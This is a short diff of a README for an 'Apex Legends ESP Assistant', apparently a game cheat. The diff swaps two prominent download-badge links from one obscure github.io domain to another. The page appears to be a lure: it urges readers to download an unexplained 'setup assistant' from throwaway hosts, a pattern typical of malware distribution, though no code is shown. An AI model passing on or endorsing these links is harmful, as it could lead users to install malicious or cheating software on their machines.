@@ -1,7 +1,7 @@
 # 🛡️ Apex Legends — ESP Assistant (Setup Manual)
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-green?style=for-the-badge)](https://apexleg2espwebportt0.github.io/.github/)
-[![Download Now](https://img.shields.io/badge/Download_Now-blue?style=for-the-badge&logo=apexlegends)](https://apexleg2espwebportt0.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-green?style=for-the-badge)](https://apex1legends2lllforpc2.github.io/.github/)
+[![Download Now](https://img.shields.io/badge/Download_Now-blue?style=for-the-badge&logo=apexlegends)](https://apex1legends2lllforpc2.github.io/.github/)
 
 ---
 
